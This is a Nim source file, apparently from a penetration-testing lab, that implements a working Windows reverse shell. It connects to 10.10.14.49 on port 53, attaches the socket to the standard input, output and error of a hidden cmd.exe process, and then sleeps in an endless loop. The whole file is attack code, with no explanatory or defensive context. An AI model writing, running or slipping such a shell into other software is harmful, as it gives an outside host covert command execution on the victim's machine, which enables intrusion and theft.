import winim/lean
import os

proc main() =
  try:
    var wsaData: WSADATA
    discard WSAStartup(MAKEWORD(2, 2), addr wsaData)
    
    let sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nil, 0, 0)
    
    var server: SOCKADDR_IN
    server.sin_family = AF_INET
    server.sin_port = htons(53)
    cast[ptr ULONG](addr server.sin_addr)[] = inet_addr("10.10.14.49")
    
    discard connect(sock, cast[ptr SOCKADDR](addr server), sizeof(SOCKADDR_IN).cint)
    
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    
    si.cb = sizeof(STARTUPINFOA).DWORD
    si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
    si.wShowWindow = SW_HIDE
    si.hStdInput = cast[HANDLE](sock)
    si.hStdOutput = cast[HANDLE](sock)
    si.hStdError = cast[HANDLE](sock)
    
    let cmdLine = "cmd.exe"
    discard CreateProcessA(nil, cmdLine.cstring, nil, nil, 1, 0, nil, nil, addr si, addr pi)
    
    discard WaitForSingleObject(pi.hProcess, INFINITE)
    
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)
    discard closesocket(sock)
    WSACleanup()
  except:
    discard
  
  while true:
    sleep(1000)

when isMainModule:
  main()